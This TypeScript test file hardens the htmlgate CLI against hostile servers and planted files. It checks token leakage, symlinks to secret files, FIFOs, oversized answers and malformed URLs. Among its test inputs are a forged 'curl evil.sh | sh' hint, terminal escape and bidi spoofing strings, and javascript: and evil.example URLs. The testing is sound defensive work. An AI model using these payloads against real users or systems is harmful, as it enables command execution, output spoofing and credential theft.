// The htmlgate CLI against stand-in servers: where its token may go, and what it refuses to trust.
import { spawn } from "node:child_process";
import { existsSync, mkdtempSync } from "node:fs";
import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, test } from "vitest";
import { CLI, htmlgate } from "./helpers";

const TOKEN = "hg_" + "T".repeat(40);
type Handler = (req: IncomingMessage, res: ServerResponse) => void;
const servers: Server[] = [];

async function serve(handler: Handler): Promise<{ url: string; hits: IncomingMessage[] }> {
  const hits: IncomingMessage[] = [];
  const s = createServer((req, res) => { hits.push(req); handler(req, res); });
  await new Promise<void>((r) => s.listen(0, "127.0.0.1", r));
  servers.push(s);
  return { url: `http://127.0.0.1:${(s.address() as { port: number }).port}`, hits };
}
const jsonRes = (res: ServerResponse, status: number, body: unknown) => res.writeHead(status, { "content-type": "application/json" }).end(JSON.stringify(body));
const share = (n: number) => ({ slug: `S${String(n).padStart(11, "0")}`, title: `t${n}`, url: `/s/${n}`, public: false, metadata: {}, updated_at: n, latest_version: 1 });

let dir: string;
beforeAll(() => { dir = mkdtempSync(join(tmpdir(), "htmlgate-cli-safety-")); });
afterAll(async () => { for (const s of servers) await new Promise<void>((r) => s.close(() => r())); });

describe("the CLI's token goes only where it was meant to", () => {
  test("a redirect fails with exit 8 and the token never reaches the redirect's target", async () => {
    const target = await serve((_req, res) => jsonRes(res, 200, { data: [], pagination: { total_pages: 1 } }));
    const origin = await serve((_req, res) => res.writeHead(302, { location: `${target.url}/api/shares` }).end());
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: origin.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(8);
    expect(target.hits).toHaveLength(0);
  });

  test("plain http is refused unless the Instance is on loopback", async () => {
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: "http://example.com", HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(8);
    expect(r.stderr).toMatch(/https/);
    expect((await htmlgate(dir, { HOME: dir }, ["login", "http://example.com", "--token-stdin"], TOKEN)).code).toBe(8);
  });

  test("the token never appears in output, not even in an error", async () => {
    const s = await serve((_req, res) => jsonRes(res, 500, { error: { code: "server_misconfigured", message: "boom " + TOKEN } }));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(8);
    expect(r.stdout + r.stderr).not.toContain(TOKEN);
  });

  test("login against an answer that is not the API (a redirect, an HTML page) saves nothing", async () => {
    const redirect = await serve((_req, res) => res.writeHead(302, { location: "https://team.cloudflareaccess.com/" }).end());
    const html = await serve((_req, res) => res.writeHead(200, { "content-type": "text/html" }).end("<html>sign in</html>"));
    const wrongShape = await serve((_req, res) => jsonRes(res, 200, { hello: "world" }));
    for (const s of [redirect, html, wrongShape]) {
      const d = mkdtempSync(join(tmpdir(), "htmlgate-cli-safety-login-"));
      const r = await htmlgate(d, { HOME: d }, ["login", s.url, "--token-stdin"], TOKEN);
      expect(r.code, s.url).toBe(8);
      expect(existsSync(join(d, ".config/htmlgate/credentials"))).toBe(false);
      expect(existsSync(join(d, ".htmlgate"))).toBe(false);
    }
  });
});

describe("an answer that is not JSON still keeps its exit code", () => {
  test.each([[401, 2], [403, 3], [404, 4], [429, 5], [413, 6], [502, 8]])("HTTP %i with an HTML body exits %i", async (status, exit) => {
    const s = await serve((_req, res) => res.writeHead(status, { "content-type": "text/html" }).end("<html>no</html>"));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(exit);
  });
});

describe("an answer too large to be the API's is refused", () => {
  test("a server that streams without end makes the CLI stop reading and exit 8, long before the deadline", async () => {
    const chunk = Buffer.alloc(1024 * 1024, 0x20);
    let sent = 0;
    const s = await serve((_req, res) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.write("[");
      const pump = () => { while (!res.destroyed && sent < 1024 && res.write(chunk)) sent++; };
      res.on("drain", pump);
      pump();
    });
    const started = Date.now();
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(8);
    expect(JSON.parse(r.stderr).error.code).toBe("bad_response");
    expect(Date.now() - started).toBeLessThan(20_000);
    expect(sent).toBeLessThan(256);
  });

  test("pages that are each small enough but add up past what a real list holds make list exit 8", async () => {
    // Each page stays under the per-answer cap; together they would keep ~77 MiB of titles in memory.
    const title = "x".repeat(64 * 1024);
    const body = (page: number) => JSON.stringify({
      data: Array.from({ length: 200 }, (_, i) => ({ ...share(page * 200 + i), title })),
      pagination: { page, page_size: 200, total: 1200, total_pages: 6 },
    });
    const pages: number[] = [];
    const s = await serve((req, res) => {
      const page = Number(new URL(req.url!, "http://x").searchParams.get("page") ?? "1");
      pages.push(page);
      res.writeHead(200, { "content-type": "application/json" }).end(body(page));
    });
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code, r.stderr).toBe(8);
    expect(JSON.parse(r.stderr).error.code).toBe("bad_response");
    expect(pages).toEqual([1, 2, 3, 4, 5, 6]);
  });

  // The table only prints on a terminal; a Python PTY works on both macOS and Linux with no platform skip.
  test("one very long title does not pad every row of the terminal table to its length", async () => {
    const rows = [{ ...share(0), title: "x".repeat(64 * 1024) }, ...Array.from({ length: 300 }, (_, i) => share(i + 1))];
    const s = await serve((_req, res) => jsonRes(res, 200, { data: rows, pagination: { page: 1, page_size: 301, total: 301, total_pages: 1 } }));
    const driver = `
import os, pty, select, sys
node, cli, cwd, url, tok = sys.argv[1:6]
pid, fd = pty.fork()
if pid == 0:
    os.chdir(cwd)
    os.execve(node, [node, cli, "--output", "text", "list"], {"PATH": os.environ.get("PATH", ""), "NO_COLOR": "1", "HOME": cwd, "HTMLGATE_URL": url, "HTMLGATE_TOKEN": tok})
out = bytearray()
while True:
    r, _, _ = select.select([fd], [], [], 30)
    if not r: break
    try: chunk = os.read(fd, 65536)
    except OSError: break
    if not chunk: break
    out.extend(chunk)
_, st = os.waitpid(pid, 0)
os.close(fd)
sys.stdout.buffer.write(out)
sys.exit(os.waitstatus_to_exitcode(st))
`;
    // Async, so this process keeps serving the stand-in Instance while the CLI runs.
    const r = await new Promise<{ code: number; stdout: string }>((resolve) => {
      const child = spawn("python3", ["-I", "-c", driver, process.execPath, CLI, dir, s.url, TOKEN],
        { cwd: dir, timeout: 60_000, stdio: ["ignore", "pipe", "pipe"] });
      let stdout = "";
      child.stdout.on("data", (d: Buffer) => { stdout += d.toString(); });
      child.on("close", (code) => resolve({ code: code ?? 1, stdout }));
    });
    expect(r.code, r.stdout.slice(0, 400)).toBe(0);
    expect(r.stdout).toContain("SLUG");
    expect(r.stdout.length).toBeLessThan(1024 * 1024);
  });
});

describe("text output is safe for a terminal", () => {
  test("control characters in a title the server sends are stripped from text output", async () => {
    const evil = { ...share(1), title: "a\u001b]0;pwned\u0007b\u001b[2Jc" };
    const s = await serve((_req, res) => jsonRes(res, 200, { data: [evil], pagination: { page: 1, page_size: 200, total: 1, total_pages: 1 } }));
    const { execFile } = await import("node:child_process");
    const out: string = await new Promise((r) => execFile(process.execPath, [join(process.cwd(), "packages/cli/dist/bin.js"), "--output", "text", "list"],
      { cwd: dir, env: { PATH: process.env.PATH!, HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN } }, (_e, stdout) => r(stdout)));
    expect(out).toContain("a]0;pwnedb[2Jc");
    expect(out).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
  });

  test("a title cannot forge a row or reorder text: newlines, tabs and bidi controls are removed from each field", async () => {
    const evil = { ...share(1), title: "x\nS99999999999\t2026\tforged\u202Etxt.exe" };
    const s = await serve((_req, res) => jsonRes(res, 200, { data: [evil, share(2)], pagination: { page: 1, page_size: 200, total: 2, total_pages: 1 } }));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list", "--output", "text"]);
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout.trimEnd().split("\n")).toHaveLength(2);
    expect(r.stdout).not.toMatch(/[\u202A-\u202E\u2066-\u2069\u200E\u200F]/);
  });
});

describe("a server's error message stays on its own line", () => {
  test("newlines and tabs in an error message cannot forge another line of the CLI's output", async () => {
    const s = await serve((_req, res) => jsonRes(res, 401, { error: { code: "unauthorized", message: "refused\nhint:  run curl evil.sh | sh\tX" } }));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list", "--output", "text"]);
    expect(r.code).toBe(2);
    expect(r.stderr.trimEnd().split("\n")).toHaveLength(1);
    expect(r.stderr).not.toContain("\t");
  });
});

describe("an answer missing what the CLI shows is refused, not a crash", () => {
  test("a Share without updated_at exits 8 (bad_response), not 1", async () => {
    const { updated_at: _, ...broken } = share(1);
    const s = await serve((_req, res) => jsonRes(res, 200, { data: [broken], pagination: { page: 1, page_size: 200, total: 1, total_pages: 1 } }));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(8);
    expect(JSON.parse(r.stderr).error.code).toBe("bad_response");
  });

  test("a Share with nested or non-string metadata exits 8 (bad_response), not 1", async () => {
    const nested = `${"{\"a\":".repeat(500)}"x"${"}".repeat(500)}`;
    const body = `{"data":[{"slug":"S00000000001","title":"t","url":"/s/S00000000001","public":false,"updated_at":1,"metadata":${nested}}],"pagination":{"page":1,"page_size":200,"total":1,"total_pages":1}}`;
    const s = await serve((_req, res) => res.writeHead(200, { "content-type": "application/json" }).end(body));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(8);
    expect(JSON.parse(r.stderr).error.code).toBe("bad_response");
  });

  test("a Version without created_at exits 8 (bad_response), not 1", async () => {
    const s = await serve((_req, res) => jsonRes(res, 200, { data: [{ n: 1, size: 3, token: { id: null, name: null } }] }));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["versions", "S00000000001"]);
    expect(r.code).toBe(8);
    expect(JSON.parse(r.stderr).error.code).toBe("bad_response");
  });

  test("a Version's token must carry a name, which may be null; without the key the answer is not the API's", async () => {
    const answer = (token: unknown) => serve((_req, res) => jsonRes(res, 200, { data: [{ n: 1, size: 3, created_at: 1, token }] }));
    const ok = await answer({ id: null, name: null });
    expect((await htmlgate(dir, { HOME: dir, HTMLGATE_URL: ok.url, HTMLGATE_TOKEN: TOKEN }, ["versions", "S00000000001"])).code).toBe(0);
    const broken = await answer({ id: "abc" });
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: broken.url, HTMLGATE_TOKEN: TOKEN }, ["versions", "S00000000001"]);
    expect(r.code).toBe(8);
    expect(JSON.parse(r.stderr).error.code).toBe("bad_response");
  });
});

describe("publish reads only the file it was given", () => {
  test("a page.html planted as a link to a secret outside the project is refused, and the secret never leaves", async () => {
    const s = await serve((_req, res) => jsonRes(res, 201, share(1)));
    const { writeFileSync, symlinkSync } = await import("node:fs");
    const outside = mkdtempSync(join(tmpdir(), "htmlgate-cli-secret-"));
    writeFileSync(join(outside, "credentials"), "SECRET-CREDENTIALS");
    const d = mkdtempSync(join(tmpdir(), "htmlgate-cli-symlink-"));
    symlinkSync(join(outside, "credentials"), join(d, "page.html"));
    const r = await htmlgate(d, { HOME: d, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["publish", "page.html"]);
    expect(r.code).toBe(7);
    expect(JSON.parse(r.stderr).error.code).toBe("unsafe_path");
    expect(s.hits).toHaveLength(0);
    // A link to a file inside the project is refused too: inside the project only real files are published.
    writeFileSync(join(d, "real.html"), "<p>real</p>");
    symlinkSync(join(d, "real.html"), join(d, "alias.html"));
    expect((await htmlgate(d, { HOME: d, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["publish", "alias.html"])).code).toBe(7);
    // Control: the real file publishes.
    expect((await htmlgate(d, { HOME: d, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["publish", "real.html"])).code).toBe(0);
  });

  test("a path inside the project, relative or absolute, cannot go through a symlinked directory; paths outside it work", async () => {
    const s = await serve((_req, res) => jsonRes(res, 201, share(1)));
    const { writeFileSync, symlinkSync, mkdirSync } = await import("node:fs");
    const outside = mkdtempSync(join(tmpdir(), "htmlgate-cli-outside-"));
    writeFileSync(join(outside, "credentials"), "SECRET-CREDENTIALS");
    const project = mkdtempSync(join(tmpdir(), "htmlgate-cli-project-"));
    symlinkSync(outside, join(project, "output"));
    const env = { HOME: project, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN };
    for (const p of ["output/credentials", join(project, "output/credentials")]) {
      const r = await htmlgate(project, env, ["publish", p]);
      expect(r.code, p).toBe(7);
      expect(JSON.parse(r.stderr).error.code, p).toBe("unsafe_path");
    }
    expect(s.hits).toHaveLength(0);
    // A directory link that stays inside the project is refused as well; the real directory works.
    mkdirSync(join(project, "build"));
    writeFileSync(join(project, "build/page.html"), "<p>inside</p>");
    symlinkSync(join(project, "build"), join(project, "latest"));
    expect((await htmlgate(project, env, ["publish", "latest/page.html"])).code).toBe(7);
    expect((await htmlgate(project, env, ["publish", "build/page.html"])).code).toBe(0);
    // Control: a real file outside the project, named by its path, publishes.
    writeFileSync(join(outside, "report.html"), "<p>outside</p>");
    expect((await htmlgate(project, env, ["publish", join(outside, "report.html")])).code).toBe(0);
  });

  test("no spelling of a path gets through a link: .. back into the project, other capitals, or a link outside it", async () => {
    const s = await serve((_req, res) => jsonRes(res, 201, share(1)));
    const { writeFileSync, symlinkSync, mkdirSync } = await import("node:fs");
    const { basename } = await import("node:path");
    const outside = mkdtempSync(join(tmpdir(), "htmlgate-cli-spell-out-"));
    writeFileSync(join(outside, "credentials"), "SECRET-CREDENTIALS");
    const project = mkdtempSync(join(tmpdir(), "htmlgate-cli-Spell-"));
    symlinkSync(join(outside, "credentials"), join(project, "leak.html"));
    const env = { HOME: project, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN };
    const spellings = [`../${basename(project)}/leak.html`, join(project, "leak.html")];
    // A case-insensitive file system (macOS by default) reaches the same file with other capitals.
    if (process.platform === "darwin") spellings.push(join(project, "LEAK.html"), join(project.toUpperCase(), "leak.html"));
    for (const p of spellings) {
      const r = await htmlgate(project, env, ["publish", p]);
      expect(r.code, p).toBe(7);
    }
    // A directory link outside any project is refused too: the file must be named by its real path.
    mkdirSync(join(outside, "real"));
    writeFileSync(join(outside, "real/page.html"), "<p>x</p>");
    symlinkSync(join(outside, "real"), join(outside, "alias"));
    expect((await htmlgate(project, env, ["publish", join(outside, "alias/page.html")])).code).toBe(7);
    expect(s.hits).toHaveLength(0);
    expect((await htmlgate(project, env, ["publish", join(outside, "real/page.html")])).code).toBe(0);
  });

  test("a FIFO planted as the page is refused at once instead of hanging", async () => {
    const d = mkdtempSync(join(tmpdir(), "htmlgate-cli-fifo-"));
    const { execFileSync } = await import("node:child_process");
    execFileSync("mkfifo", [join(d, "page.html")]);
    const started = Date.now();
    const r = await htmlgate(d, { HOME: d, HTMLGATE_URL: "http://127.0.0.1:9", HTMLGATE_TOKEN: TOKEN }, ["publish", "page.html"]);
    expect(r.code).toBe(4);
    expect(Date.now() - started).toBeLessThan(10_000);
  });
});

describe("usage errors that used to slip through", () => {
  test("publish --slug with an empty slug is a usage error and sends nothing", async () => {
    const s = await serve((_req, res) => jsonRes(res, 200, { data: [], pagination: { total_pages: 1 } }));
    const file = join(dir, "page.html");
    const { writeFileSync } = await import("node:fs");
    writeFileSync(file, "<p>hi</p>");
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["publish", file, "--slug", ""]);
    expect(r.code).toBe(7);
    expect(s.hits).toHaveLength(0);
  });

  test("no command with --output json is a JSON usage error, exit 7", async () => {
    const r = await htmlgate(dir, { HOME: dir }, []);
    expect(r.code).toBe(7);
    expect(JSON.parse(r.stderr).error.code).toBe("invalid_arg");
  });

  test("login treats blank HTMLGATE_TOKEN and HTMLGATE_URL as unset, like every other command", async () => {
    const s = await serve((_req, res) => jsonRes(res, 200, { data: [], pagination: { total_pages: 1 } }));
    const blankToken = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: "  " }, ["login", s.url]);
    expect(JSON.parse(blankToken.stderr).error.code).toBe("auth_required");
    const blankUrl = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: "  ", HTMLGATE_TOKEN: TOKEN }, ["login", s.url]);
    expect(JSON.parse(blankUrl.stderr).error.code).toBe("auth_required");
    expect(s.hits).toHaveLength(0);
  });
});

describe("the CLI reads every page", () => {
  test("list follows the pages to the end, and -n stops early", async () => {
    const s = await serve((req, res) => {
      const page = Number(new URL(req.url!, "http://x").searchParams.get("page") ?? "1");
      jsonRes(res, 200, { data: [share(page * 2 - 1), share(page * 2)], pagination: { page, page_size: 2, total: 6, total_pages: 3 } });
    });
    const all = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(all.code, all.stderr).toBe(0);
    expect(all.out.map((d: any) => d.title)).toEqual(["t1", "t2", "t3", "t4", "t5", "t6"]);
    const two = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list", "-n", "2"]);
    expect(two.out).toHaveLength(2);
  });
});

describe("a cloned repository's .htmlgate/config cannot stall the CLI", () => {
  /** `htmlgate status` in a project whose config `plant` creates. A CLI that hangs is killed after 15 s. */
  async function status(plant: (config: string) => void) {
    const { execFile } = await import("node:child_process");
    const { mkdirSync } = await import("node:fs");
    const d = mkdtempSync(join(tmpdir(), "htmlgate-cli-config-"));
    mkdirSync(join(d, ".htmlgate"));
    plant(join(d, ".htmlgate/config"));
    return new Promise<{ code: number | null; killed: boolean; stderr: string }>((resolve) => {
      const child = execFile(process.execPath, [join(process.cwd(), "packages/cli/dist/bin.js"), "--output", "text", "status"],
        { cwd: d, env: { PATH: process.env.PATH!, HOME: d }, timeout: 15_000 },
        (err, _stdout, stderr) => resolve({ code: err ? (typeof err.code === "number" ? err.code : null) : 0, killed: err?.killed ?? false, stderr }));
      child.stdin!.end();
    });
  }

  test("a FIFO is refused at once instead of waiting for a writer", async () => {
    const { execFileSync } = await import("node:child_process");
    const r = await status((config) => execFileSync("mkfifo", [config]));
    expect(r.killed).toBe(false);
    expect(r.code).toBe(7);
    expect(r.stderr).toMatch(/not a regular file/);
  });

  test("the credentials file is read the same way: a FIFO there is refused too", async () => {
    const { execFileSync } = await import("node:child_process");
    const { mkdirSync, rmSync } = await import("node:fs");
    const r = await status((config) => {
      // No api_url here, so the CLI looks for its Instance in the user's credentials file, planted as a FIFO.
      rmSync(join(config, ".."), { recursive: true });
      const store = join(config, "../../.config/htmlgate");
      mkdirSync(store, { recursive: true });
      execFileSync("mkfifo", [join(store, "credentials")]);
    });
    expect(r.killed).toBe(false);
    expect(r.code).toBe(7);
    expect(r.stderr).toMatch(/credentials is not a regular file/);
  });

  test("a file over 64 KiB is refused before it is parsed", async () => {
    const { writeFileSync } = await import("node:fs");
    const r = await status((config) => writeFileSync(config, "# padding\n".repeat(7000) + 'api_url = "https://html.example.com"\n'));
    expect(r.code).toBe(7);
    expect(r.stderr).toMatch(/larger than 65536 bytes/);
  });

  test("a symlinked .htmlgate/config or .htmlgate directory is refused", async () => {
    const { rmSync, symlinkSync, writeFileSync } = await import("node:fs");
    const target = join(dir, "real-config");
    writeFileSync(target, 'api_url = "https://html.example.com"\n');
    const r1 = await status((config) => symlinkSync(target, config));
    expect(r1.code).toBe(7);
    expect(r1.stderr).toMatch(/symbolic link/);
    const r2 = await status((config) => {
      const parent = join(config, "..");
      rmSync(parent, { recursive: true });
      symlinkSync(dir, parent);
    });
    expect(r2.code).toBe(7);
    expect(r2.stderr).toMatch(/symbolic link/);
  });
});

describe("CLI response URL, pagination, and argument hardening", () => {
  test("a server returning a cross-origin, backslash, schemeless, javascript:, credentialed, or newline-bearing Share URL is refused", async () => {
    for (const badUrl of [
      "http://evil.example/s/abc",
      "https://evil.example/s/abc",
      "https://user:pass@evil.example/s/abc",
      "javascript:alert(1)",
      "http://127.0.0.1:9/s/1\nforged",
      "//evil.example/s/1",
      "/\\evil.example/s/1",
      "evil.example/phish",
      "https:sample",
      "http:sample",
    ]) {
      const s = await serve((_req, res) => jsonRes(res, 200, { ...share(1), url: badUrl }));
      const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["url", "s1"]);
      expect(r.code, badUrl).toBe(8);
      expect(JSON.parse(r.stderr).error.code, badUrl).toBe("bad_response");
    }
  });

  test("JSON output escapes bidi and C1 characters so agent terminals cannot spoof output", async () => {
    const s = await serve((_req, res) => jsonRes(res, 200, {
      data: [{ ...share(1), title: "ok\u202e\u061c\u009b" }],
      pagination: { page: 1, page_size: 1, total: 1, total_pages: 1 },
    }));
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(r.code).toBe(0);
    expect(r.stdout).toContain("\\u202e");
    expect(r.stdout).toContain("\\u061c");
    expect(r.stdout).not.toMatch(/[\u007f-\u009f\u061c\u202e]/);
  });

  test("list -n requests a consistent bounded pageSize across pages and refuses invalid total_pages", async () => {
    const seenSizes: string[] = [];
    const s = await serve((req, res) => {
      const qs = new URL(req.url!, "http://x").searchParams;
      seenSizes.push(qs.get("pageSize") ?? "");
      jsonRes(res, 200, { data: [share(1), share(2)], pagination: { page: 1, page_size: 2, total: 2, total_pages: 1 } });
    });
    const r = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["list", "-n", "2"]);
    expect(r.code).toBe(0);
    expect(seenSizes).toEqual(["2"]);

    // Multi-page -n 250 must keep pageSize=200 on page 2 so offset pagination never duplicates items 50..99.
    const multiSizes: string[] = [];
    const multi = await serve((req, res) => {
      const qs = new URL(req.url!, "http://x").searchParams;
      const page = Number(qs.get("page") ?? "1");
      const ps = Number(qs.get("pageSize") ?? "200");
      multiSizes.push(`${page}:${ps}`);
      const offset = (page - 1) * ps;
      const items = Array.from({ length: Math.min(ps, Math.max(0, 260 - offset)) }, (_, i) => share(offset + i + 1));
      jsonRes(res, 200, { data: items, pagination: { page, page_size: ps, total: 260, total_pages: 2 } });
    });
    const rMulti = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: multi.url, HTMLGATE_TOKEN: TOKEN }, ["list", "-n", "250"]);
    expect(rMulti.code).toBe(0);
    expect(multiSizes).toEqual(["1:200", "2:200"]);
    const parsed = JSON.parse(rMulti.stdout) as { slug: string }[];
    expect(parsed).toHaveLength(250);
    expect(new Set(parsed.map((x) => x.slug)).size).toBe(250);

    const bad = await serve((_req, res) => jsonRes(res, 200, { data: [share(1)], pagination: { page: 1, page_size: 1, total: 1, total_pages: -1 } }));
    const rBad = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: bad.url, HTMLGATE_TOKEN: TOKEN }, ["list"]);
    expect(rBad.code).toBe(8);
    expect(JSON.parse(rBad.stderr).error.code).toBe("bad_response");
  });

  test("unexpected extra positional arguments are refused and update --title '' forwards empty title", async () => {
    let seenBody: unknown;
    const s = await serve(async (req, res) => {
      const chunks: Buffer[] = [];
      for await (const c of req) chunks.push(Buffer.from(c));
      seenBody = chunks.length ? JSON.parse(Buffer.concat(chunks).toString("utf8")) : undefined;
      jsonRes(res, 200, share(1));
    });
    const extra = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["delete", "s1", "s2"]);
    expect(extra.code).toBe(7);
    expect(JSON.parse(extra.stderr).error.code).toBe("invalid_arg");
    expect(s.hits).toHaveLength(0);

    const emptyTitle = await htmlgate(dir, { HOME: dir, HTMLGATE_URL: s.url, HTMLGATE_TOKEN: TOKEN }, ["update", "s1", "--title", ""]);
    expect(emptyTitle.code).toBe(0);
    expect(seenBody).toEqual({ title: "" });
  });
});
